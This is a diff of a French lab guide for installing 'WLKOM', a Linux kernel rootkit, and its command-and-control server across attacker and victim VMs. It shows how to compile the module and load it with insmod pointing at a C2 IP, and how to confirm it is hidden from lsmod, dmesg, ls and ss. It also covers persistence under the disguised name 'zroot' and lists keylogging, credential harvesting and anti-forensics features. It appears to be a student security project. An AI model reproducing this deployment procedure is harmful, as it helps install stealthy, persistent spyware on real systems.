@@ -32,8 +32,8 @@
 | 2 | [Pré-requis](#2---pre-requis) | Matériel, logiciels, connaissances |
 | 3 | [Installation de la virtualisation](#3---installation-de-lenvironnement-de-virtualisation) | QEMU/KVM sur Arch Linux, Ubuntu, Debian |
 | 4 | [Création des machines virtuelles](#4---creation-des-machines-virtuelles) | Téléchargement ISO, création VM, installation Debian |
-| 5 | [Configuration VM Victime](#5---configuration-de-la-vm-victime) | Outils de compilation, headers noyau |
-| 6 | [Configuration VM Attaquante](#6---configuration-de-la-vm-attaquante) | Python, venv, dépendances |
+| 5 | [Configuration VM victim](#5---configuration-de-la-vm-victime) | Outils de compilation, headers noyau |
+| 6 | [Configuration VM attacker](#6---configuration-de-la-vm-attaquante) | Python, venv, dépendances |
 | 7 | [Compilation du rootkit](#7---compilation-du-rootkit) | make, vérification du .ko |
 | 8 | [Déploiement du rootkit](#8---deploiement-du-rootkit) | insmod, paramètres, vérification |
 | 9 | [Lancement du C2](#9---lancement-du-c2) | Démarrage serveur, connexion rootkit |
@@ -63,7 +63,7 @@ WLKOM est un **rootkit Linux** qui fonctionne comme un **module noyau** (LKM - L
   │                                                                  │
   │    VM ATTAQUANTE                       VM VICTIME                │
   │    Debian 12                           Debian 12                 │
-  │    192.168.122.96                      192.168.122.18            │
+  │    192.168.122.167                      192.168.122.146            │
   │                                                                  │
   │   ┌──────────────────┐    TCP chiffré   ┌──────────────────┐    │
   │   │                  │   ChaCha20-Poly1305 │                  │    │
@@ -115,12 +115,14 @@ WLKOM est un **rootkit Linux** qui fonctionne comme un **module noyau** (LKM - L
 | Dissimulation de processus (ps) | Hook getdents64 sur /proc |
 | Chiffrement réseau | ChaCha20-Poly1305 AEAD |
 | Keylogger | keyboard_notifier + TTY sniffer (SSH inclus) |
-| Interface web C2 complète | Dashboard temps réel, 15+ panneaux |
+| Interface web C2 complète | Dashboard temps réel, 17 panneaux |
 | Navigateur de fichiers distant | Browse, view, upload, download, delete |
 | Gestionnaire de processus distant | ps + kill depuis l'interface |
-| Sniffer réseau | tcpdump intégré |
-| Déploiement/Désinstallation à distance | Compilation + chargement depuis le web |
-| Mapping MITRE ATT&CK | Cartographie des techniques utilisées |
+| Analyse réseau complète | Connexions, interfaces, routes, ARP, DNS, port scan, capture, topologie |
+| Surveillance | Session spy, file monitor, auth logs |
+| Credentials & Harvest | Extraction automatisée de secrets, privesc vectors |
+| Anti-Forensics | Destruction de preuves, nettoyage d'artefacts |
+| Self-Destruct | Suppression complète du rootkit et de ses traces |
 
 ---
 
@@ -157,10 +159,10 @@ La machine hôte = votre PC physique (le laptop de l'école sous Arch Linux par 
 
 Les deux VMs utilisent **Debian 12 (Bookworm)**.
 
-| | VM Victime | VM Attaquante |
+| | VM victim | VM attacker |
 |:---|:---|:---|
 | **OS** | Debian 12 | Debian 12 |
-| **Noyau** | 6.1.0-44-amd64 | 6.1.0-49-amd64 |
+| **Noyau** | 6.1.0-49-amd64 | 6.1.0-49-amd64 |
 | **Rôle** | Exécute le rootkit | Exécute le C2 |
 | **IP** | Attribuée par DHCP (voir section 4.5) | Attribuée par DHCP (voir section 4.5) |
 | **Utilisateur** | `victim` / `victim` | `attacker` / `attacker` |
@@ -289,9 +291,13 @@ Vérifiez que le fichier est bien téléchargé :
 ls -lh ~/Downloads/debian-12*.iso
 ```
 
+![Téléchargement de l'ISO](screenshots/Installation%20VM/wget-iso.png)
+
+![Vérification de l'ISO](screenshots/Installation%20VM/verification-iso.png)
+
 ---
 
-### 4.2 - Créer la VM Victime
+### 4.2 - Créer la VM victim
 
 **Étape 1** - Ouvrez virt-manager :
 
@@ -299,110 +305,185 @@ ls -lh ~/Downloads/debian-12*.iso
 virt-manager
 ```
 
-<!-- SCREENSHOT: virt-manager fenêtre principale -->
-<!-- ![virt-manager](screenshots/virt-manager-main.png) -->
+![virt-manager fenêtre principale](screenshots/Installation%20VM/virt-manager-main.png)
 
-**Étape 2** - Cliquez sur le bouton **"+"** (Créer une nouvelle machine virtuelle) en haut à gauche.
+**Étape 2** - Cliquez sur **File → New Virtual Machine** (ou le bouton **"+"** en haut à gauche).
+
+![Créer une nouvelle VM](screenshots/Installation%20VM/virt-manager-new-vm.png)
 
 **Étape 3** - Source d'installation :
-- Sélectionnez : **"Media d'installation local (image ISO ou CDROM)"**
-- Cliquez **Suivant**
+- Sélectionnez : **"Local install media (ISO image or CDROM)"**
+- Cliquez **Forward**
+
+![Sélection du media d'installation](screenshots/Installation%20VM/vm-step1-media.png)
 
 **Étape 4** - Sélectionnez l'ISO :
-- Cliquez **Parcourir** → **Parcourir en local**
-- Naviguez vers `~/Downloads/` et sélectionnez l'ISO Debian 12 téléchargée
+- Cliquez **Browse** → naviguez vers l'ISO Debian 12 téléchargée
 - Le système détecte automatiquement "Debian 12"
-- Cliquez **Suivant**
+- Cliquez **Forward**
 
-<!-- SCREENSHOT: sélection de l'ISO dans virt-manager -->
-<!-- ![ISO selection](screenshots/virt-manager-iso.png) -->
+![Sélection de l'ISO](screenshots/Installation%20VM/vm-step2-iso.png)
 
 **Étape 5** - Mémoire et CPU :
 ```
-Mémoire (RAM) : 2048 Mo
-CPUs          : 2
+Memory : 2048 MiB
+CPUs   : 2
 ```
-- Cliquez **Suivant**
+- Cliquez **Forward**
+
+![Mémoire et CPU](screenshots/Installation%20VM/vm-step3-memory-cpu.png)
 
 **Étape 6** - Stockage :
 ```
-Créer un disque pour la VM : 10 Go
+Create a disk image for the virtual machine : 10 GiB
 ```
-- Cliquez **Suivant**
+- Cliquez **Forward**
+
+![Stockage](screenshots/Installation%20VM/vm-step4-storage.png)
 
 **Étape 7** - Paramètres finaux :
 ```
-Nom : victim
+Name : victim
 ```
-- Cochez : **"Personnaliser la configuration avant l'installation"**
-- Réseau : vérifiez que c'est **"Réseau virtuel 'default' : NAT"**
-- Cliquez **Terminer**
+- Cochez : **"Customize configuration before install"**
+- Network : vérifiez que c'est **"Virtual network 'default' : NAT"**
+- Cliquez **Finish**
 
-<!-- SCREENSHOT: configuration finale VM (nom, réseau) -->
-<!-- ![VM config](screenshots/virt-manager-config.png) -->
+![Paramètres finaux](screenshots/Installation%20VM/vm-step5-config.png)
 
-**Étape 8** - Dans la fenêtre de configuration qui s'ouvre, cliquez **"Commencer l'installation"** en haut à gauche.
+**Étape 8** - Dans la fenêtre de configuration qui s'ouvre, cliquez **"Begin Installation"** en haut à gauche.
+
+![Commencer l'installation](screenshots/Installation%20VM/vm-begin-install.png)
 
 ---
 
 ### 4.3 - Installer Debian 12 (pour chaque VM)
 
-L'installateur Debian se lance. Suivez ces étapes :
+L'installateur Debian se lance. Sélectionnez **Graphical install** :
 
-| Étape | Choix |
-|:---|:---|
-| Langue | Français (ou English) |
-| Pays | France |
-| Clavier | Français (azerty) |
-| Nom de la machine | `victim` (ou `attacker` pour la 2e VM) |
-| Nom de domaine | *(laisser vide)* |
-| Mot de passe root | `root` (ou celui de votre choix) |
-| Nom complet du nouvel utilisateur | `Victim User` (ou `Attacker User` pour la 2e VM) |
-| Identifiant (login) | `victim` (ou `attacker` pour la 2e VM) |
-| Mot de passe utilisateur | `victim` (ou `attacker` pour la 2e VM) |
-| Partitionnement | **"Assisté - utiliser un disque entier"** |
-| Schéma de partition | **"Tout dans une seule partition"** |
-| Miroir Debian | Voir ci-dessous |
-| Proxy | *(laisser vide)* |
-| Popularity contest | Non |
+![Graphical install](screenshots/Installation%20VM/debian-graphical-install.png)
 
-**Configuration du miroir Debian :**
+Suivez ces étapes une par une :
 
-- Sélectionnez `France` → `deb.debian.org`.
-- **Si ça boucle** (retour à l'écran précédent) : la VM n'a pas accès à internet. Choisissez **"Revenir en arrière"** puis **"Continuer sans miroir réseau"**. Vous configurerez le miroir après l'installation (voir ci-dessous).
+---
+
+**Langue** — Sélectionnez English (ou Français) :
+
+![Langue](screenshots/Installation%20VM/debian-langue.png)
+
+**Pays** — Sélectionnez **other** → **Europe** → **France** :
+
+![Other](screenshots/Installation%20VM/debian-other.png)
+
+![Europe](screenshots/Installation%20VM/debian-europe.png)
+
+![France](screenshots/Installation%20VM/debian-france.png)
+
+**Locale** — Sélectionnez votre locale :
+
+![Locale](screenshots/Installation%20VM/debian-locale.png)
+
+**Clavier** — Sélectionnez votre disposition clavier :
+
+![Clavier](screenshots/Installation%20VM/debian-clavier.png)
+
+**Nom de la machine** — Entrez `victim` (ou `attacker` pour la 2e VM) :
+
+![Hostname](screenshots/Installation%20VM/debian-hostname.png)
+
+**Nom de domaine** — Laissez vide :
+
+![Domaine](screenshots/Installation%20VM/debian-domain.png)
+
+**Mot de passe root** — Entrez `root` :
+
+![Mot de passe root](screenshots/Installation%20VM/debian-root-password.png)
+
+**Nom complet de l'utilisateur** — Entrez `Victim User` (ou `Attacker User` pour la 2e VM) :
+
+![Nom complet](screenshots/Installation%20VM/debian-user-fullname.png)
+
+**Identifiant (login)** — Entrez `victim` (ou `attacker` pour la 2e VM) :
+
+![Login](screenshots/Installation%20VM/debian-user-login.png)
+
+**Mot de passe utilisateur** — Entrez `victim` (ou `attacker` pour la 2e VM) :
+
+![Mot de passe utilisateur](screenshots/Installation%20VM/debian-user-password.png)
+
+**Partitionnement** — Sélectionnez **"Guided - use entire disk"** :
+
+![Partitionnement](screenshots/Installation%20VM/debian-partitionnement.png)
+
+**Schéma de partition** — Sélectionnez **"All files in one partition"** :
+
+![Schéma de partition](screenshots/Installation%20VM/debian-partition-schema.png)
+
+Confirmez les changements :
+
+![Confirmation partition](screenshots/Installation%20VM/debian-partition-confirm.png)
+
+Écrivez les changements sur le disque :
+
+![Écriture partition](screenshots/Installation%20VM/debian-partition-write.png)
+
+**Miroir Debian** — Sélectionnez votre pays puis `deb.debian.org` :
+
+![Miroir pays](screenshots/Installation%20VM/debian-miroir-pays.png)
+
+![Miroir Debian](screenshots/Installation%20VM/debian-miroir.png)
+
+> **Si ça boucle** (retour à l'écran précédent) : la VM n'a pas accès à internet. Choisissez **"Go Back"** puis **"Continue without a network mirror"**. Vous configurerez le miroir après l'installation (voir ci-dessous).
+
+**Proxy** — Laissez vide :
+
+![Proxy](screenshots/Installation%20VM/debian-proxy.png)
+
+**Popularity contest** — Sélectionnez **No** :
+
+![Popularity contest](screenshots/Installation%20VM/debian-popularity.png)
 
 **Sélection des logiciels** (écran important) :
 
 Vous avez deux options selon votre préférence :
 
-**Option A — Sans interface graphique** (recommandé, plus léger) :
+**Option A — Sans interface graphique** (plus léger) :
 
 - **DÉCOCHEZ TOUT** sauf :
-  - [x] Serveur SSH
-  - [x] Utilitaires usuels du système
+  - [x] SSH server
+  - [x] standard system utilities
 - Avantage : la VM consomme moins de RAM et de disque
 - Vous vous connecterez en SSH ou via la console virt-manager
 
-**Option B — Avec interface graphique** :
+**Option B — Avec interface graphique** (comme sur la capture ci-dessous) :
 
 - Cochez :
-  - [x] Environnement de bureau Debian
-  - [x] XFCE (léger) ou GNOME (plus complet)
-  - [x] Serveur SSH
-  - [x] Utilitaires usuels du système
+  - [x] Debian desktop environment
+  - [x] GNOME (ou XFCE pour plus léger)
+  - [x] SSH server
+  - [x] standard system utilities
 - Avantage : vous pouvez utiliser la VM avec un bureau comme un PC normal
 - Inconvénient : prend plus de place (~2-3 Go de plus) et de RAM
 
-<!-- SCREENSHOT: écran de sélection des logiciels pendant l'installation Debian -->
-<!-- ![Software selection](screenshots/debian-software-selection.png) -->
+![Sélection des logiciels](screenshots/Installation%20VM/debian-software-selection.png)
 
-> **Dans les deux cas**, cochez toujours **Serveur SSH** pour pouvoir vous connecter à distance.
+> **Dans les deux cas**, cochez toujours **SSH server** pour pouvoir vous connecter à distance.
 
-**Installation de GRUB** :
-- Installer GRUB sur le disque principal : **Oui**
-- Périphérique : `/dev/vda`
+**Installation de GRUB** — Sélectionnez **Yes** :
 
-Attendez la fin de l'installation, retirez l'ISO et redémarrez.
+![GRUB](screenshots/Installation%20VM/debian-grub.png)
+
+**Périphérique** — Sélectionnez `/dev/vda` :
+
+![Périphérique GRUB](screenshots/Installation%20VM/debian-grub-device.png)
+
+**Fin de l'installation** — Cliquez **Continue** pour redémarrer :
+
+![Fin de l'installation](screenshots/Installation%20VM/debian-finish.png)
+
+Après le redémarrage, vous arrivez sur l'écran de connexion :
+
+![Connexion VM](screenshots/Installation%20VM/vm-login-victim.png)
 
 **Si vous avez sauté l'étape du miroir** : après le reboot, connectez-vous en root (soit via la console virt-manager, soit en SSH) et exécutez :
 
@@ -420,11 +501,11 @@ Cela configure le miroir et installe le serveur SSH.
 
 ---
 
-### 4.4 - Créer la VM Attaquante
+### 4.4 - Créer la VM attacker
 
 Répétez **exactement** les étapes 4.2 et 4.3, avec cette seule différence :
 
-| Paramètre | VM Victime | VM Attaquante |
+| Paramètre | VM victim | VM attacker |
 |:---|:---|:---|
 | Nom de la VM | `victim` | `attacker` |
 | Hostname | `victim` | `attacker` |
@@ -450,10 +531,13 @@ ip -4 addr show
 
 Cherchez l'interface réseau qui a une IP en `192.168.122.X` :
 
-```
-2: enp1s0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
-    inet 192.168.122.18/24 brd 192.168.122.255 scope global dynamic enp1s0
-```
+Exemple sur la VM victim :
+
+![IP Victime](screenshots/Installation%20VM/ip-victim.png)
+
+Exemple sur la VM attacker :
+
+![IP Attaquante](screenshots/Installation%20VM/ip-attacker.png)
 
 > Le nom de l'interface peut varier selon votre configuration : `enp1s0`, `ens3`, `eth0`... Peu importe le nom, c'est l'IP qui compte.
 
@@ -461,11 +545,11 @@ Cherchez l'interface réseau qui a une IP en `192.168.122.X` :
 
 | VM | IP (exemple) | Votre IP |
 |:---|:---|:---|
-| Victime | `192.168.122.18` | *à compléter* |
-| Attaquante | `192.168.122.96` | *à compléter* |
+| Victime | `192.168.122.146` | *à compléter* |
+| Attaquante | `192.168.122.167` | *à compléter* |
 
-> **Dans toute la suite de ce document**, quand vous voyez `192.168.122.18`, remplacez par **l'IP de votre VM Victime**.
-> Quand vous voyez `192.168.122.96`, remplacez par **l'IP de votre VM Attaquante**.
+> **IMPORTANT — Dans toute la suite de ce document**, les IPs `192.168.122.146` (victime) et `192.168.122.167` (attaquante) sont utilisées comme **exemples**.
+> **Remplacez-les systématiquement par vos propres IPs** récupérées ci-dessus.
 
 Vous pouvez aussi récupérer les IPs depuis la machine hôte avec :
 
@@ -474,32 +558,34 @@ Vous pouvez aussi récupérer les IPs depuis la machine hôte avec :
 virsh net-dhcp-leases default
 ```
 
-Sortie exemple :
-
-```
- Expiry Time           MAC address         IP address          Hostname
- 2026-06-24 15:30:00   52:54:00:xx:xx:xx   192.168.122.18/24   victim
- 2026-06-24 15:30:00   52:54:00:yy:yy:yy   192.168.122.96/24   attacker
-```
+![virsh net-dhcp-leases](screenshots/Installation%20VM/virsh-dhcp-leases.png)
 
 ### 4.6 - Tester la connectivité
 
 Depuis la **machine hôte** (votre PC), remplacez les IPs par les vôtres :
 
 ```bash
-# Ping la VM Victime (remplacez par votre IP)
+# Ping la VM victim (remplacez par votre IP)
 ping -c 2 <IP_VICTIME>
 
-# Ping la VM Attaquante (remplacez par votre IP)
+# Ping la VM attacker (remplacez par votre IP)
 ping -c 2 <IP_ATTAQUANTE>
 ```
 
-Depuis la **VM Attaquante** :
+Depuis la **VM attacker** :
 
 ```bash
-# Ping la VM Victime (remplacez par votre IP)
+# Ping la VM victim (remplacez par votre IP)
 ping -c 2 <IP_VICTIME>
 ```
+
+Ping depuis la machine hôte vers les deux VMs :
+
+![Ping depuis l'hôte](screenshots/Installation%20VM/ping-from-host.png)
+
+Ping depuis la VM attacker vers la VM victim :
+
+![Ping depuis l'attacker](screenshots/Installation%20VM/ping-from-attacker.png)
 
 > Si les pings fonctionnent (0% packet loss), la connectivité est OK.
 
@@ -507,9 +593,9 @@ ping -c 2 <IP_VICTIME>
 
 ---
 
-## 5 - Configuration de la VM Victime
+## 5 - Configuration de la VM victim
 
-Connectez-vous à la VM Victime. Vous avez **deux méthodes** au choix :
+Connectez-vous à la VM victim. Vous avez **deux méthodes** au choix :
 
 ---
 
@@ -518,9 +604,6 @@ Connectez-vous à la VM Victime. Vous avez **deux méthodes** au choix :
 1. Double-cliquez sur la VM `victim` dans virt-manager pour ouvrir sa console
 2. Connectez-vous avec `root` / `root`
 3. Vous êtes directement en root, pas besoin de `su -`
-
-<!-- SCREENSHOT: console virt-manager avec le login root -->
-<!-- ![Console VM](screenshots/virt-manager-console.png) -->
 
 > Cette méthode fonctionne toujours, même si le réseau n'est pas encore configuré.
 
@@ -532,8 +615,8 @@ Connectez-vous à la VM Victime. Vous avez **deux méthodes** au choix :
 > Il faut d'abord se connecter avec le compte utilisateur créé pendant l'installation, puis passer root.
 
 ```bash
-# 1. Se connecter avec l'utilisateur de la VM Victime (remplacez l'IP par la vôtre)
-ssh victim@192.168.122.18
+# 1. Se connecter avec l'utilisateur de la VM victim (remplacez l'IP par la vôtre)
+ssh victim@192.168.122.146
 # Mot de passe : victim
 
 # 2. Une fois connecté, passer root
@@ -541,7 +624,15 @@ su -
 # Mot de passe : root
 ```
 
-> Remplacez `192.168.122.18` par l'IP de votre VM Victime (voir section 4.5).
+> Lors de la **première connexion SSH**, le terminal affiche l'empreinte du serveur et demande :
+> ```
+> Are you sure you want to continue connecting (yes/no/[fingerprint])?
+> ```
+> Tapez **`yes`** (le mot complet, pas juste `y`) puis appuyez Entrée. C'est normal, SSH enregistre la VM dans vos hôtes connus.
+
+> **Remplacez** `192.168.122.146` par l'IP de votre VM victim (voir section 4.5).
+
+![Connexion SSH à la VM victim](screenshots/Partie5/ssh-victim.png)
 
 ---
 
@@ -554,6 +645,10 @@ apt update
 apt install -y build-essential linux-headers-$(uname -r) gcc make
 ```
 
+![Installation des outils de compilation](screenshots/Partie5/apt-install-build.png)
+
+> Faites la même chose sur la VM attacker.
+
 ### 5.2 - Vérifier l'installation
 
 ```bash
@@ -562,6 +657,8 @@ ls /lib/modules/$(uname -r)/build/Makefile
 ```
 
 > Si le fichier existe, les headers sont OK.
+
+![Vérification des headers](screenshots/Partie5/verify-headers.png)
 
 ```bash
 # Vérifier le compilateur
@@ -574,20 +671,24 @@ make --version
 
 # Vérifier la version du noyau
 uname -r
-# Doit afficher : 6.1.0-44-amd64 ou similaire
+# Doit afficher : 6.1.0-49-amd64 ou similaire
 ```
+
+![Vérification gcc, make et uname](screenshots/Partie5/verify-gcc-make-uname.png)
 
 ### 5.3 - Créer le répertoire de travail
 
 ```bash
-mkdir -p /root/wlkom/rootkit
+mkdir -p /root/wlkom/zroot
 ```
+
+![Création du répertoire](screenshots/Partie5/mkdir-wlkom.png)
 
 ---
 
-## 6 - Configuration de la VM Attaquante
+## 6 - Configuration de la VM attacker
 
-Connectez-vous à la VM Attaquante (même choix de méthode que pour la victime) :
+Connectez-vous à la VM attacker (même choix de méthode que pour victim) :
 
 ---
 
@@ -598,8 +699,8 @@ Connectez-vous à la VM Attaquante (même choix de méthode que pour la victime)
 **Méthode B — SSH depuis l'hôte** :
 
 ```bash
-# 1. Se connecter avec l'utilisateur de la VM Attaquante (remplacez l'IP par la vôtre)
-ssh attacker@192.168.122.96
+# 1. Se connecter avec l'utilisateur de la VM attacker (remplacez l'IP par la vôtre)
+ssh attacker@192.168.122.167
 # Mot de passe : attacker
 
 # 2. Passer root
@@ -607,7 +708,11 @@ su -
 # Mot de passe : root
 ```
 
-> Remplacez `192.168.122.96` par l'IP de votre VM Attaquante (voir section 4.5).
+> Même chose que pour victim : tapez **`yes`** lors de la première connexion pour accepter l'empreinte.
+
+> **Remplacez** `192.168.122.167` par l'IP de votre VM attacker (voir section 4.5).
+
+![Connexion SSH à la VM attacker](screenshots/Partie5/ssh-attacker.png)
 
 ---
 
@@ -618,17 +723,23 @@ apt update
 apt install -y python3 python3-venv python3-pip sshpass
 ```
 
+![Installation Python et outils](screenshots/Partie6/apt-install-python.png)
+
 ### 6.2 - Créer l'environnement virtuel Python
 
 ```bash
 python3 -m venv /opt/wlkom-c2
 ```
 
+![Création du venv](screenshots/Partie6/python-venv.png)
+
 ### 6.3 - Installer les dépendances Python
 
 ```bash
 /opt/wlkom-c2/bin/pip install fastapi uvicorn[standard] websockets cryptography
 ```
+
+![Installation des dépendances pip](screenshots/Partie6/pip-install-deps.png)
 
 ### 6.4 - Vérifier l'installation
 
@@ -644,11 +755,13 @@ print('=> Tout est OK')
 
 Sortie attendue :
 ```
-FastAPI   : 0.136.1
-Uvicorn   : 0.47.0
+FastAPI   : 0.138.0
+Uvicorn   : 0.49.0
 WebSockets: 16.0
 => Tout est OK
 ```
+
+![Vérification de l'installation Python](screenshots/Partie6/verify-python.png)
 
 ### 6.5 - Créer l'arborescence
 
@@ -657,33 +770,41 @@ mkdir -p /opt/wlkom-c2/server
 mkdir -p /opt/wlkom-c2/rootkit
 ```
 
+![Création de l'arborescence](screenshots/Partie6/mkdir-arborescence.png)
+
 ---
 
 ## 7 - Compilation du rootkit
 
-### 7.1 - Copier les sources vers la VM Victime
+### 7.1 - Copier les sources vers la VM victim
 
 **Méthode A — Via SCP depuis la machine hôte** (si vous utilisez SSH) :
 
 ```bash
 cd wlkom/
 
-# Copier le code source vers la VM Victime (remplacez l'IP par la vôtre)
-scp rootkit/wlkom.c victim@192.168.122.18:/tmp/
-scp rootkit/Makefile victim@192.168.122.18:/tmp/
+# Copier le code source vers la VM victim (remplacez l'IP par la vôtre)
+scp rootkit/wlkom.c victim@192.168.122.146:/tmp/
+scp rootkit/Makefile victim@192.168.122.146:/tmp/
 # Mot de passe : victim
 ```
+
+![SCP des fichiers vers la VM victim](screenshots/Partie7/scp-host-to-victim.png)
+
+> **Remplacez** `192.168.122.146` par l'IP de votre VM victim (voir section 4.5).
 
 Ensuite, connectez-vous à la VM et déplacez les fichiers en root :
 
 ```bash
-ssh victim@192.168.122.18
+ssh victim@192.168.122.146
 # Mot de passe : victim
 su -
 # Mot de passe : root
-mv /tmp/wlkom.c /root/wlkom/rootkit/
-mv /tmp/Makefile /root/wlkom/rootkit/
+mv /tmp/wlkom.c /root/wlkom/zroot/
+mv /tmp/Makefile /root/wlkom/zroot/
 ```
+
+![Déplacement des fichiers en root](screenshots/Partie7/ssh-mv-files.png)
 
 **Méthode B — Directement sur la console de la VM** (si vous utilisez virt-manager) :
 
@@ -692,59 +813,36 @@ Si vous avez installé l'interface graphique sur la VM, vous pouvez copier les f
 Sinon, le plus simple est d'utiliser `wget` ou `curl` depuis la VM pour récupérer les fichiers depuis un dépôt Git :
 
 ```bash
-# En root sur la VM Victime
+# En root sur la VM victim
 apt install -y git
 git clone https://github.com/yazidtarmoul/ZeroTrust.git /tmp/wlkom-src
-cp /tmp/wlkom-src/rootkit/wlkom.c /root/wlkom/rootkit/
-cp /tmp/wlkom-src/rootkit/Makefile /root/wlkom/rootkit/
+cp /tmp/wlkom-src/rootkit/wlkom.c /root/wlkom/zroot/
+cp /tmp/wlkom-src/rootkit/Makefile /root/wlkom/zroot/
 ```
 
 ### 7.2 - Compiler
 
-Toujours en root dans la VM Victime :
+Toujours en root dans la VM victim :
 
 ```bash
-cd /root/wlkom/rootkit
+cd /root/wlkom/zroot
 make
 ```
 
-**Sortie attendue :**
-
-```
-make -C /lib/modules/6.1.0-44-amd64/build M=/root/wlkom/rootkit modules
-make[1]: Entering directory '/usr/src/linux-headers-6.1.0-44-amd64'
-  CC [M]  /root/wlkom/rootkit/wlkom.o
-  MODPOST /root/wlkom/rootkit/Module.symvers
-  CC [M]  /root/wlkom/rootkit/wlkom.mod.o
-  LD [M]  /root/wlkom/rootkit/wlkom.ko
-make[1]: Leaving directory '/usr/src/linux-headers-6.1.0-44-amd64'
-```
+![Compilation du rootkit](screenshots/Partie7/make-compile.png)
 
 ### 7.3 - Vérifier
 
 ```bash
-# Le fichier doit exister et peser environ 300-500 Ko
-ls -lh /root/wlkom/rootkit/wlkom.ko
+# Le fichier doit exister et peser environ 300-600 Ko
+ls -lh /root/wlkom/zroot/wlkom.ko
 
 # Vérifier les infos du module
-modinfo /root/wlkom/rootkit/wlkom.ko
+modinfo /root/wlkom/zroot/wlkom.ko
 ```
 
-Sortie de `modinfo` :
+![Vérification du module (ls + modinfo)](screenshots/Partie7/verify-modinfo.png)
 
-```
-filename:       /root/wlkom/rootkit/wlkom.ko
-version:        1.4
-description:    Wild Linux Kernel Object Module
-author:         wlkom
-license:        GPL
-parm:           pw_hash:charp
-parm:           c2_ip:charp
-parm:           c2_port:int
-```
-
-<!-- SCREENSHOT: compilation réussie (sortie make + modinfo) -->
-<!-- ![Compilation](screenshots/compilation.png) -->
 
 ### 7.4 - Nettoyage (optionnel)
 
@@ -774,14 +872,24 @@ echo -n "wlkom2024" | sha256sum | awk '{print $1}'
 
 Le hash ressemble à : `a1b2c3d4e5f6...` (64 caractères hexadécimaux).
 
-### 8.2 - Charger le rootkit
+### 8.2 - Charger le module crypto
 
-Sur la **VM Victime** :
+Le rootkit utilise ChaCha20-Poly1305 pour le chiffrement. Il faut d'abord charger le module crypto dans le noyau :
 
 ```bash
-insmod /root/wlkom/rootkit/wlkom.ko \
+modprobe libchacha20poly1305
+```
+
+> Sans cette étape, `insmod` échouera avec l'erreur `Unknown symbol chacha20poly1305_encrypt`.
+
+### 8.3 - Charger le rootkit
+
+Sur la **VM victim** :
+
+```bash
+insmod /root/wlkom/zroot/wlkom.ko \
   pw_hash="$(echo -n 'wlkom2024' | sha256sum | awk '{print $1}')" \
-  c2_ip="192.168.122.96" \
+  c2_ip="192.168.122.167" \
   c2_port=9999
 ```
 
@@ -790,12 +898,14 @@ insmod /root/wlkom/rootkit/wlkom.ko \
 | Paramètre | Description | Exemple |
 |:---|:---|:---|
 | `pw_hash` | Hash SHA-256 du mot de passe | `$(echo -n 'wlkom2024' \| sha256sum \| awk '{print $1}')` |
-| `c2_ip` | IP de la VM Attaquante | `192.168.122.96` |
+| `c2_ip` | IP de la VM attacker | `192.168.122.167` |
 | `c2_port` | Port d'écoute du C2 | `9999` |
 
-> **Remplacez** `192.168.122.96` par l'IP réelle de votre VM Attaquante !
+> **Remplacez** `192.168.122.167` par l'IP réelle de votre VM attacker (voir section 4.5) !
 
-### 8.3 - Vérifier le chargement
+![Chargement du rootkit](screenshots/Partie8/insmod-load.png)
+
+### 8.4 - Vérifier le chargement
 
 ```bash
 dmesg | tail -10
@@ -816,12 +926,11 @@ dmesg | tail -10
 [xxx.xxx] wlkom: C2 thread started
 ```
 
-> **Attention** : une fois actif, le rootkit filtre `dmesg` et ces lignes disparaissent !
+> **Attention** : une fois actif, le rootkit filtre `dmesg` et ces lignes disparaissent ! C'est normal — le hook `sys_read` masque toutes les lignes contenant "wlkom".
 
-<!-- SCREENSHOT: sortie dmesg après chargement du rootkit -->
-<!-- ![dmesg](screenshots/dmesg-loaded.png) -->
+![dmesg après chargement — les logs du rootkit sont filtrés](screenshots/Partie8/dmesg-loaded.png)
 
-### 8.4 - Vérifier la dissimulation
+### 8.5 - Vérifier la dissimulation
 
 Après quelques secondes, le rootkit se cache complètement :
 
@@ -847,10 +956,9 @@ ss -tnp | grep 9999
 # (aucun résultat = OK)
 ```
 
-<!-- SCREENSHOT: preuves de dissimulation (lsmod vide, ls vide, ss vide) -->
-<!-- ![Stealth proof](screenshots/stealth-proof.png) -->
+![Preuves de dissimulation — tout est invisible](screenshots/Partie8/stealth-proof.png)
 
-### 8.5 - Persistance au reboot
+### 8.6 - Persistance au reboot
 
 Le rootkit configure **automatiquement** sa persistance lors du premier chargement. Voici ce qu'il fait :
 
@@ -861,7 +969,7 @@ Le rootkit configure **automatiquement** sa persistance lors du premier chargeme
 4. Exécute depmod -a                       (met à jour la base des modules)
 ```
 
-Après un reboot de la VM Victime, le rootkit se charge automatiquement et se reconnecte au C2.
+Après un reboot de la VM victim, le rootkit se charge automatiquement et se reconnecte au C2.
 
 > **Nom "zroot"** : le module est copié sous le nom `zroot.ko` pour la discrétion (pas de référence à "wlkom" dans les fichiers de config).
 
@@ -869,23 +977,27 @@ Après un reboot de la VM Victime, le rootkit se charge automatiquement et se re
 
 ## 9 - Lancement du C2
 
-### 9.1 - Copier le C2 sur la VM Attaquante
+### 9.1 - Copier le C2 sur la VM attacker
 
 **Méthode A — Via SCP depuis la machine hôte** :
 
 ```bash
 cd wlkom/
 
-# Copier les fichiers vers la VM Attaquante (remplacez l'IP par la vôtre)
-scp attacking_program/c2.py attacker@192.168.122.96:/tmp/
-scp rootkit/wlkom.c attacker@192.168.122.96:/tmp/
+# Copier les fichiers vers la VM attacker (remplacez l'IP par la vôtre)
+scp attacking_program/c2.py attacker@192.168.122.167:/tmp/
+scp rootkit/wlkom.c attacker@192.168.122.167:/tmp/
 # Mot de passe : attacker
 ```
+
+> **Remplacez** `192.168.122.167` par l'IP de votre VM attacker (voir section 4.5).
+
+<img src="screenshots/Partie9/scp-c2-to-attacker.png" width="800">
 
 Connectez-vous et déplacez les fichiers en root :
 
 ```bash
-ssh attacker@192.168.122.96
+ssh attacker@192.168.122.167
 # Mot de passe : attacker
 su -
 # Mot de passe : root
@@ -893,10 +1005,12 @@ mv /tmp/c2.py /opt/wlkom-c2/server/c2.py
 mv /tmp/wlkom.c /opt/wlkom-c2/rootkit/wlkom.c
 ```
 
+<img src="screenshots/Partie9/mv-files-attacker.png" width="800">
+
 **Méthode B — Via Git directement sur la VM** :
 
 ```bash
-# En root sur la VM Attaquante
+# En root sur la VM attacker
 apt install -y git
 git clone https://github.com/yazidtarmoul/ZeroTrust.git /tmp/wlkom-src
 cp /tmp/wlkom-src/attacking_program/c2.py /opt/wlkom-c2/server/c2.py
@@ -905,7 +1019,7 @@ cp /tmp/wlkom-src/rootkit/wlkom.c /opt/wlkom-c2/rootkit/wlkom.c
 
